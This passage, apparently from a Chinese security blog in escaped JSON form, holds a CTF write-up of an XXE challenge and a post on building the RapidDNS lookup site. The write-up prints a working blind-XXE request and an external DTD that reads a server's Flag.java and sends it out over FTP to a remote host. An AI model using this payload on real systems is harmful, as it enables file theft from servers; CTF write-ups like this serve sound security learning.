  // var escape = "[{&#34;content&#34;:&#34;&lt;p&gt;大家好，我是BaCde，上周临时组队参与了HackTheBox组织的Cyber Apocalyps 2021的CTF比赛。今天主要写一下Web的Artillery，这是一道3星题（最难为4星），这是一道关于XXE利用的题，做出来的人相对很少，也花了不少时间，有些收获，这里写出来与大家分享。本文不介绍基础知识，如果要学习基础可以查看后面的推荐文章。&lt;/p&gt;\n&lt;h2 id=\&#34;收集信息\&#34;&gt;收集信息&lt;/h2&gt;\n&lt;p&gt;此次的CTF题大部分都提供源代码，并提供有Dockerfile文件，可通过docker build构建并运行。通过源码可知源代码为Java语言。openjdk 1.8.181版本，Web Server为Tomcat10。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1619594216716.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;./ctf_xxe6.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;通过Web.xml可知访问路径。访问页面只有一个搜索功能，你访问页面并在搜索框随意输入内容，可看到具体发送的请求。使用Brup记录并转发到Repeater，后面测试用。这里是自己搭建的Docker环境，访问地址http://42.192.74.184:18888。&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1619594224803.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;./ctf_xxe2.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;接下来查看源代码，具体业务实现的代码在Results.java中。功能就是接收POST提交的数据，先验证XML格式，然后在处理XML，最后解析的内容进入到数据库查询，返回结果。结合web.xml文件可知请求的路径就是上面的搜索功能了。&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1619594229408.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;./ctf_xxe3.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;h2 id=\&#34;漏洞探测\&#34;&gt;漏洞探测&lt;/h2&gt;\n&lt;p&gt;代码看上去基本都做了过滤处理，唯一一处就是第31行，允许file协议 。尝试读取一下/etc/passwd文件，发现报错，而且无法显示文件内容。尝试其他协议都会被拒绝。想来也不会这么简单。思路如下：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;尝试file://url/看是否可以外连。&lt;/li&gt;\n&lt;li&gt;尝试jar:file://path!/xmlpath 这样的路径。&lt;/li&gt;\n&lt;li&gt;利用系统自带的一些dtd。&lt;/li&gt;\n&lt;li&gt;利用unix的socket文件。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;通过file://这样的方式可以发现发起了DNS请求，但是未收到HTTP的请求。这说明可以进行网络通信。而jar协议是支持的，找了几个路径，发现都利用失败了。而第三种，通过查看Dockerfile文件发现对系统自带的dtd文件都删掉了。第四种也没想到具体该如何利用。在测试过程中也可以注意到一个细节，就是在validate的那段代码，报错后是直接return的，如果validate通过，那么会进入下面的解析代码，导致无法利用。&lt;/p&gt;\n&lt;p&gt;这里一度没有任何进展。重新梳理思路，回头继续看第一个，仔细查看了报错信息，有一个地方吸引了我,可以发现报错主要是FTP连接错误，这就解释为什么没有http请求了，因为是FTP协议。&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1619594241282.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;./ctf_xxe.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;h2 id=\&#34;获取flag\&#34;&gt;获取Flag&lt;/h2&gt;\n&lt;p&gt;使用vsftpd搭建FTP服务，启用匿名访问，防火墙端口全放开。最开始就是因为防火墙没开放（pasv模式的关系），导致传输文件失败，耗了不少时间。通过FTP的方式，发现确实可以将文件内容带出来，但是/etc/passwd的文件内容只有一行。后来修改了一下payload，直接将Flag.java文件通过报错的方式显示出来。&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1619594247559.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;./ctf_xxe4.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;payload如下：&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-raw\&#34;&gt;POST /search HTTP/1.1\nHost: 42.192.74.184:18888\nContent-Length: 131\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36\nContent-Type: application/xml\nAccept: */*\nOrigin: http://42.192.74.184:18888\nAccept-Encoding: gzip, deflate\nAccept-Language: en,zh-CN;q=0.9,zh;q=0.8\nConnection: close\n\n&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;\n&amp;lt;!DOCTYPE cdl [&amp;lt;!ENTITY % asd SYSTEM &amp;quot;file://42.192.74.184/evil_ftp_file.dtd&amp;quot;&amp;gt;%asd;%c;]&amp;gt;\n&amp;lt;cdl&amp;gt;&amp;amp;rrr;&amp;lt;/cdl&amp;gt;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1619594254352.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;./ctf_xxe5.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;evil_ftp_file.dtd内容：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;&amp;lt;!ENTITY % d SYSTEM &amp;quot;file:///tomcat/webapps/ROOT/WEB-INF/classes/Flag.java&amp;quot;&amp;gt;\n&amp;lt;!ENTITY % c &amp;quot;&amp;lt;!ENTITY rrr SYSTEM &#39;file://%d;另外一个ftp服务地址/%d;&#39;&amp;gt;&amp;quot;&amp;gt;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&#34;总结\&#34;&gt;总结&lt;/h2&gt;\n&lt;p&gt;从此次解题可确定在openjdk 1.8.181环境下，使用&lt;code&gt;Validator&lt;/code&gt;并允许file协议时对xml进行validate时可以发起ftp请求，同时也支持jar协议。其他环境大家可自行测试。&lt;/p&gt;\n&lt;p&gt;其利用方式有如下几种：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;在这样的情况下可利用ftp外带dtd读取任意文件。&lt;/li&gt;\n&lt;li&gt;在没有删除本地dtd或xml文件情况下，可利用本地的dtd、xml文件进行利用。&lt;/li&gt;\n&lt;li&gt;利用jar协议，通过加载jar中的xml或dtd文件进行利用。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;一些资料推荐\&#34;&gt;一些资料推荐&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;&lt;a href=\&#34;https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/\&#34;&gt;Blind XXE attacks – Out of band interaction Techniques (OAST) to exfilterate data&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://github.com/xlocux/XXE-DTD-Finder\&#34;&gt;XXE-DTD-Finder&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://blog.noob.ninja/spilling-local-files-via-xxe-when/\&#34;&gt;Spilling Local Files via XXE when HTTP OOB fails&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://newrouge.medium.com/xxe-from-zero-to-hero-b38118750556\&#34;&gt;XXE : From Zero to Hero&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://gosecure.github.io/xxe-workshop/#1\&#34;&gt;Advanced XXE Exploitation&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;http://immunityservices.blogspot.com/2021/02/misconfigurations-in-java-xml-parsers.html\&#34;&gt;Misconfigurations in Java XML Parsers&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md\&#34;&gt;XXE payloads for specific DTDs&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/\&#34;&gt;Exploiting XXE with local DTD files&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html\&#34;&gt;Automating local DTD discovery for XXE exploitation&lt;/a&gt;&lt;/li&gt;\n&lt;/ol&gt;\n&#34;,&#34;fileName&#34;:&#34;Cyber-Apocalypse-2021-Web-Artillery-WriteUP&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;大家好，我是BaCde，上周临时组队参与了HackTheBox组织的Cyber Apocalyps 2021的CTF比赛。今天主要写一下Web的Artillery，这是一道3星题（最难为4星），这是一道关于XXE利用的题，做出来的人相对很少，也花了不少时间，有些收获，这里写出来与大家分享。本文不介绍基础知识，如果要学习基础可以查看后面的推荐文章。&lt;/p&gt;\n&lt;h2 id=\&#34;收集信息\&#34;&gt;收集信息&lt;/h2&gt;\n&lt;p&gt;此次的CTF题大部分都提供源代码，并提供有Dockerfile文件，可通过docker build构建并运行。通过源码可知源代码为Java语言。openjdk 1.8.181版本，Web Server为Tomcat10。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;Cyber Apocalypse 2021 Web Artillery WriteUP&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;WriteUP&#34;,&#34;slug&#34;:&#34;fghQ27byw&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/fghQ27byw/&#34;},{&#34;name&#34;:&#34;CTF&#34;,&#34;slug&#34;:&#34;RS0rtshx-O&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/RS0rtshx-O/&#34;},{&#34;name&#34;:&#34;XXE&#34;,&#34;slug&#34;:&#34;xkpjq3sx6J&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/xkpjq3sx6J/&#34;},{&#34;name&#34;:&#34;Cyber Apocalypse 2021&#34;,&#34;slug&#34;:&#34;ItRx6SRfOt&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/ItRx6SRfOt/&#34;}],&#34;date&#34;:&#34;2021-04-28 15:15:04&#34;,&#34;dateFormat&#34;:&#34;2021-04-28&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Cyber-Apocalypse-2021-Web-Artillery-WriteUP/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;5 min read&#34;,&#34;time&#34;:277000,&#34;words&#34;:1148,&#34;minutes&#34;:5},&#34;description&#34;:&#34;大家好，我是BaCde，上周临时组队参与了HackTheBox组织的Cyber Apocalyps 2021的CTF比赛。今天主要写一下Web的Artillery，这是一道3星题（最难为4星），这是一道关于XXE利用的题，做出来的人相对很少...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF\&#34;&gt;收集信息&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B\&#34;&gt;漏洞探测&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%8E%B7%E5%8F%96flag\&#34;&gt;获取Flag&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%80%BB%E7%BB%93\&#34;&gt;总结&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%B8%80%E4%BA%9B%E8%B5%84%E6%96%99%E6%8E%A8%E8%8D%90\&#34;&gt;一些资料推荐&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;大家好！我是BaCde，2020年3月我着手开发RapidDNS这个网站，并于2020年4月1日正式上线。&lt;/p&gt;\n&lt;p&gt;RapidDNS.io是一个在线域名查询和IP反向查询的网站。有超过25亿条记录，支持5种（A,AAAA,CNAME,MX,CERT）数据类型。到目前为止，网站全球Alexa排名15万左右并累计提供超过1亿次查询。现每月网站流量超过1TB。除此之外网站也被加入到Amass，OneForAll，theHarvester，Sudomy，subfinder，ksubdomain等众多知名开源项目中。&lt;/p&gt;\n&lt;p&gt;接下来我就跟大家分享建设这个网站的过程。&lt;/p&gt;\n&lt;h2 id=\&#34;产生想法\&#34;&gt;产生想法&lt;/h2&gt;\n&lt;p&gt;2020年在做子域名收集的开发时，想起了Rapid7的DNS数据。经过对其进行分析后，确认是我需要的内容。于是便有了做一个在线的网站的想法，即方便自己同时又可以方便其他有需要的人。&lt;/p&gt;\n&lt;p&gt;有了这个想法后就开始计划目标，确定只做子域名查询和IP地址反查。其实在开发时，想自己跑数据，但是资源有限。就决定先以Rapid7的DNS数据来尝试。后续也可根据具体情况在增加功能。&lt;/p&gt;\n&lt;h2 id=\&#34;面临的问题\&#34;&gt;面临的问题&lt;/h2&gt;\n&lt;p&gt;开始实现之前要考虑如何以最低的成本实现最好的效果。最好的效果即在多人同时访问时保证查询速度和系统稳定。因为这将直接决定采用什么样的架构来实现。&lt;/p&gt;\n&lt;p&gt;先来分析下建设网站需要的东西。包括一个域名和至少一台服务器，用来存放web和数据。数据存储的空间至少要300gb，cpu至少双核，内存至少4g。这是没有增量和保存历史记录的情况。到各家云厂商,idc机房，根据这个配置对比了其价格，最低的服务器成本也要5000块一年（仅是数据存储）。&lt;/p&gt;\n&lt;p&gt;因为打算做免费网站，这样的成本超出了我的预期，而且也可能性能不够。对于这个数据，国外已经有几篇数据运用的文章。其实现的思路有：1. 采用aws的Athena实现，2. 开源的DNSGrep，包括RapidDNS上线后采用mongodb实现的开源项目等。因为大多数围绕的是子域名查询，没有IP地址反查功能。而且Athena将随着用户数量增加，其费用也将非常恐怖，更适合自用。说了这么多，主要的问题说白了就是穷。&lt;/p&gt;\n&lt;p&gt;另外一个省钱的思路就是从已有资源来想办法，这时想到了跟随我多年联想的笔记本电脑，它已经吃灰好久了，这是一个可利用的资源。这样只需要再买一个web服务器就可以了。根据之前调查的价格，这样的服务器一年大概需要不到2000块。&lt;/p&gt;\n&lt;p&gt;但是这就产生了另外一个问题，家里的网络是光纤，没有固定ip地址，而且之前测试发现外网ip是无法直接访问的，映射端口是不行的。做端口转发？这个的性能没测试过，无法保证，也不打算采用。当然这里我想到了一个解决办法，在下面的内容中会讲到。&lt;/p&gt;\n&lt;h2 id=\&#34;解决方案\&#34;&gt;解决方案&lt;/h2&gt;\n&lt;p&gt;经过上面的考虑，最终我采用下面的结构。后来经过线上的运行情况，稳定性和查询速度还在接受的范围内。后续也可以增加worker和消息队列来支持其他方式的数据增加。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1616415608484.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;本地服务器就是我的一台笔记本电脑，其配置是3代i7，8G内存。1.2TB的固态硬盘(1TB+250TB两块组成)。数据存储与查询使用的是elasticsearch，前面加了一层nginx，并配置了认证。&lt;/p&gt;\n&lt;p&gt;外部服务器是一台云主机，配置好为双核4G内存。包括nginx反向代理和Flask做的web查询界面。 外面又加了一层CDN。上面没有公网IP的问题，取了个巧，因为现在家里的网络都支持IPv6，所以外部服务器直接使用IPv6地址直连家里的笔记本电脑。&lt;/p&gt;\n&lt;p&gt;这里说点额外的，对于IPv6地址是可以直接连接的，不需要做映射。一般我们家里的电脑会分配多个IPv6地址，有至少一个临时（temporary，我们连接其他电脑时使用）的地址和secured的。一般我们可以设置一个固定的即可。这里大家还是注意点，避免泄漏IPv6地址。之前看一篇公众号文章，发现对目标的IPv4地址打码了，却没有对IPv6地址打码，这个挺危险的。&lt;/p&gt;\n&lt;p&gt;以上这套结构的成本为域名450元，cdn服务器免费的，服务器每月费用20美元（差不多140元），电费每月大概60元。前期投入买了一块三星的SSD，成本1000元。截止目前为止，共投入450+2400+1000=3850元。后续维持现状基本是服务器加域名成本，一年2850元。&lt;/p&gt;\n&lt;h2 id=\&#34;编码\&#34;&gt;编码&lt;/h2&gt;\n&lt;p&gt;需要的一些基础知识：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;html+javascript+css基础&lt;/li&gt;\n&lt;li&gt;python+flask基础&lt;/li&gt;\n&lt;li&gt;elasticsearch基础&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;其实想好了方案，而且本身也不复杂，具体编码就相对简单了许多。比如查询界面的开发，我直接找了一套现成的模版，改改样式就可以了。后端flask边看文档边开发就可以了，没啥好说的。唯一要说一下的是这里flask使用了协程，其查询效果好了很多。当然后面跟insight-labs的A牛沟通过可以换bjoern，据说效果很好，不过这个我没测试，感兴趣的可以试试看，看完也可以分享出来让我学习学习。&lt;/p&gt;\n&lt;p&gt;主要的还是在Elasticsearch这里，这里选择他主要因为我比较熟悉，而且有IP字段类型，做IP段查询时非常方便。这里换乘其他的如mongodb、mysql等也可以。mysql使用myisam，加上Partition问题也不大，Insight-labs的QQ群数据查询就是成功案例。大家可以选择自己擅长的。&lt;/p&gt;\n&lt;p&gt;后来有朋友过来交流查询速度问题，说他那边的查询速度没我的快。其实主要我这边做了一些优化处理。我在导入数据时，对域名处理，将根域名单独存放一个字段，剩下的部分单独放一个字段。因为不需要模糊匹配，查询速度就会非常快，同时存储空间也可以节省几十G。当然，这牺牲掉了模糊搜索的功能。具体字段可以看下图：&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1616415600955.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;创建mapping：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;{\n  &amp;quot;mappings&amp;quot;: {\n    &amp;quot;domain&amp;quot;: {\n      &amp;quot;properties&amp;quot;: {\n        &amp;quot;name&amp;quot;: {\n          &amp;quot;type&amp;quot;: &amp;quot;text&amp;quot;\n\n        },\n        &amp;quot;type&amp;quot;: {\n          &amp;quot;type&amp;quot;: &amp;quot;keyword&amp;quot;\n\n        },\n        &amp;quot;value&amp;quot;: {\n          &amp;quot;type&amp;quot;: &amp;quot;ip&amp;quot;\n\n        },\n        &amp;quot;domain&amp;quot;: {\n          &amp;quot;type&amp;quot;: &amp;quot;keyword&amp;quot;\n\n        }\n      }\n    }\n  }\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;最关键的其实是导入程序，也是投入时间最多的，因为数据量比较多。单纯使用bulk速度很慢。使用SSD速度会提高几倍。但是依然达不到预期，因为会出现es内存耗尽，队列太多等各种异常，比如导入到8亿多数据时报错。也尝试通过迭代的方式来实现高性能文件读取，但是最后主要的根源还是在es和字符串的处理上。最后采用多进程方式。elasticsearch设置不刷新，0副本，并调整es的queue，线程，最大内存等参数。这个需要根据自己机器配置去进行调整。通过实际使用一天导入大概10亿条记录，当然还是有优化空间的。&lt;/p&gt;\n&lt;p&gt;修改index设置的方法：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;{\n  &amp;quot;index&amp;quot;: {\n    &amp;quot;refresh_interval&amp;quot;: -1,\n    &amp;quot;number_of_replicas&amp;quot;: 0\n  }\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;导入完成后在修改回去即可。&lt;/p&gt;\n&lt;p&gt;以上elasticsearch使用的是6.7.1版本。其他版本可能会有差异，根据实际情况调整即可。&lt;/p&gt;\n&lt;h2 id=\&#34;总结\&#34;&gt;总结&lt;/h2&gt;\n&lt;p&gt;其实总体来说，本文技术上没啥复杂度，实现起来也相对简单。我觉得有点像以前革命时期八路军的风格（完了往自己脸上贴金了，勿喷），在有限的条件下来尽可能实现自己想要的效果。&lt;/p&gt;\n&lt;p&gt;希望本文对你有所帮助，对于上述内容有任何疑问，可以给我发送消息一起交流。&lt;/p&gt;\n&lt;p&gt;最后，RapidDNS已经一周年，这一年家人和同事的支持，同学的帮助，以及国内外朋友的称赞和鼓励，才让我坚持维护着网站运行。感谢在网站运行中大家提来的建议和反馈！感谢所有使用RapidDNS的人！感谢你们让RapidDNS更好。&lt;br&gt;\n所以，RapidDNS现有查询功能将一直免费开放下去，同时新的一年我也会增加新的功能，也欢迎大家发来你们的建议和想法。&lt;/p&gt;\n&lt;p&gt;大家也可以关注公众账号，获取最新的网站功能、使用技巧等内容。&lt;/p&gt;\n&lt;center&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;3\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615992545149.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;/center&gt;\n&lt;!-- more --&gt;\n&lt;center&gt;The End&lt;/center&gt;&#34;,&#34;fileName&#34;:&#34;RapidDNS-03&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;大家好！我是BaCde，2020年3月我着手开发RapidDNS这个网站，并于2020年4月1日正式上线。&lt;/p&gt;\n&lt;p&gt;RapidDNS.io是一个在线域名查询和IP反向查询的网站。有超过25亿条记录，支持5种（A,AAAA,CNAME,MX,CERT）数据类型。到目前为止，网站全球Alexa排名15万左右并累计提供超过1亿次查询。现每月网站流量超过1TB。除此之外网站也被加入到Amass，OneForAll，theHarvester，Sudomy，subfinder，ksubdomain等众多知名开源项目中。&lt;/p&gt;\n&lt;p&gt;接下来我就跟大家分享建设这个网站的过程。&lt;/p&gt;\n&lt;h2 id=\&#34;产生想法\&#34;&gt;产生想法&lt;/h2&gt;\n&lt;p&gt;2020年在做子域名收集的开发时，想起了Rapid7的DNS数据。经过对其进行分析后，确认是我需要的内容。于是便有了做一个在线的网站的想法，即方便自己同时又可以方便其他有需要的人。&lt;/p&gt;\n&lt;p&gt;有了这个想法后就开始计划目标，确定只做子域名查询和IP地址反查。其实在开发时，想自己跑数据，但是资源有限。就决定先以Rapid7的DNS数据来尝试。后续也可根据具体情况在增加功能。&lt;/p&gt;\n&lt;h2 id=\&#34;面临的问题\&#34;&gt;面临的问题&lt;/h2&gt;\n&lt;p&gt;开始实现之前要考虑如何以最低的成本实现最好的效果。最好的效果即在多人同时访问时保证查询速度和系统稳定。因为这将直接决定采用什么样的架构来实现。&lt;/p&gt;\n&lt;p&gt;先来分析下建设网站需要的东西。包括一个域名和至少一台服务器，用来存放web和数据。数据存储的空间至少要300gb，cpu至少双核，内存至少4g。这是没有增量和保存历史记录的情况。到各家云厂商,idc机房，根据这个配置对比了其价格，最低的服务器成本也要5000块一年（仅是数据存储）。&lt;/p&gt;\n&lt;p&gt;因为打算做免费网站，这样的成本超出了我的预期，而且也可能性能不够。对于这个数据，国外已经有几篇数据运用的文章。其实现的思路有：1. 采用aws的Athena实现，2. 开源的DNSGrep，包括RapidDNS上线后采用mongodb实现的开源项目等。因为大多数围绕的是子域名查询，没有IP地址反查功能。而且Athena将随着用户数量增加，其费用也将非常恐怖，更适合自用。说了这么多，主要的问题说白了就是穷。&lt;/p&gt;\n&lt;p&gt;另外一个省钱的思路就是从已有资源来想办法，这时想到了跟随我多年联想的笔记本电脑，它已经吃灰好久了，这是一个可利用的资源。这样只需要再买一个web服务器就可以了。根据之前调查的价格，这样的服务器一年大概需要不到2000块。&lt;/p&gt;\n&lt;p&gt;但是这就产生了另外一个问题，家里的网络是光纤，没有固定ip地址，而且之前测试发现外网ip是无法直接访问的，映射端口是不行的。做端口转发？这个的性能没测试过，无法保证，也不打算采用。当然这里我想到了一个解决办法，在下面的内容中会讲到。&lt;/p&gt;\n&lt;h2 id=\&#34;解决方案\&#34;&gt;解决方案&lt;/h2&gt;\n&lt;p&gt;经过上面的考虑，最终我采用下面的结构。后来经过线上的运行情况，稳定性和查询速度还在接受的范围内。后续也可以增加worker和消息队列来支持其他方式的数据增加。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1616415608484.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;本地服务器就是我的一台笔记本电脑，其配置是3代i7，8G内存。1.2TB的固态硬盘(1TB+250TB两块组成)。数据存储与查询使用的是elasticsearch，前面加了一层nginx，并配置了认证。&lt;/p&gt;\n&lt;p&gt;外部服务器是一台云主机，配置好为双核4G内存。包括nginx反向代理和Flask做的web查询界面。 外面又加了一层CDN。上面没有公网IP的问题，取了个巧，因为现在家里的网络都支持IPv6，所以外部服务器直接使用IPv6地址直连家里的笔记本电脑。&lt;/p&gt;\n&lt;p&gt;这里说点额外的，对于IPv6地址是可以直接连接的，不需要做映射。一般我们家里的电脑会分配多个IPv6地址，有至少一个临时（temporary，我们连接其他电脑时使用）的地址和secured的。一般我们可以设置一个固定的即可。这里大家还是注意点，避免泄漏IPv6地址。之前看一篇公众号文章，发现对目标的IPv4地址打码了，却没有对IPv6地址打码，这个挺危险的。&lt;/p&gt;\n&lt;p&gt;以上这套结构的成本为域名450元，cdn服务器免费的，服务器每月费用20美元（差不多140元），电费每月大概60元。前期投入买了一块三星的SSD，成本1000元。截止目前为止，共投入450+2400+1000=3850元。后续维持现状基本是服务器加域名成本，一年2850元。&lt;/p&gt;\n&lt;h2 id=\&#34;编码\&#34;&gt;编码&lt;/h2&gt;\n&lt;p&gt;需要的一些基础知识：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;html+javascript+css基础&lt;/li&gt;\n&lt;li&gt;python+flask基础&lt;/li&gt;\n&lt;li&gt;elasticsearch基础&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;其实想好了方案，而且本身也不复杂，具体编码就相对简单了许多。比如查询界面的开发，我直接找了一套现成的模版，改改样式就可以了。后端flask边看文档边开发就可以了，没啥好说的。唯一要说一下的是这里flask使用了协程，其查询效果好了很多。当然后面跟insight-labs的A牛沟通过可以换bjoern，据说效果很好，不过这个我没测试，感兴趣的可以试试看，看完也可以分享出来让我学习学习。&lt;/p&gt;\n&lt;p&gt;主要的还是在Elasticsearch这里，这里选择他主要因为我比较熟悉，而且有IP字段类型，做IP段查询时非常方便。这里换乘其他的如mongodb、mysql等也可以。mysql使用myisam，加上Partition问题也不大，Insight-labs的QQ群数据查询就是成功案例。大家可以选择自己擅长的。&lt;/p&gt;\n&lt;p&gt;后来有朋友过来交流查询速度问题，说他那边的查询速度没我的快。其实主要我这边做了一些优化处理。我在导入数据时，对域名处理，将根域名单独存放一个字段，剩下的部分单独放一个字段。因为不需要模糊匹配，查询速度就会非常快，同时存储空间也可以节省几十G。当然，这牺牲掉了模糊搜索的功能。具体字段可以看下图：&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1616415600955.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;创建mapping：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;{\n  &amp;quot;mappings&amp;quot;: {\n    &amp;quot;domain&amp;quot;: {\n      &amp;quot;properties&amp;quot;: {\n        &amp;quot;name&amp;quot;: {\n          &amp;quot;type&amp;quot;: &amp;quot;text&amp;quot;\n\n        },\n        &amp;quot;type&amp;quot;: {\n          &amp;quot;type&amp;quot;: &amp;quot;keyword&amp;quot;\n\n        },\n        &amp;quot;value&amp;quot;: {\n          &amp;quot;type&amp;quot;: &amp;quot;ip&amp;quot;\n\n        },\n        &amp;quot;domain&amp;quot;: {\n          &amp;quot;type&amp;quot;: &amp;quot;keyword&amp;quot;\n\n        }\n      }\n    }\n  }\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;最关键的其实是导入程序，也是投入时间最多的，因为数据量比较多。单纯使用bulk速度很慢。使用SSD速度会提高几倍。但是依然达不到预期，因为会出现es内存耗尽，队列太多等各种异常，比如导入到8亿多数据时报错。也尝试通过迭代的方式来实现高性能文件读取，但是最后主要的根源还是在es和字符串的处理上。最后采用多进程方式。elasticsearch设置不刷新，0副本，并调整es的queue，线程，最大内存等参数。这个需要根据自己机器配置去进行调整。通过实际使用一天导入大概10亿条记录，当然还是有优化空间的。&lt;/p&gt;\n&lt;p&gt;修改index设置的方法：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;{\n  &amp;quot;index&amp;quot;: {\n    &amp;quot;refresh_interval&amp;quot;: -1,\n    &amp;quot;number_of_replicas&amp;quot;: 0\n  }\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;导入完成后在修改回去即可。&lt;/p&gt;\n&lt;p&gt;以上elasticsearch使用的是6.7.1版本。其他版本可能会有差异，根据实际情况调整即可。&lt;/p&gt;\n&lt;h2 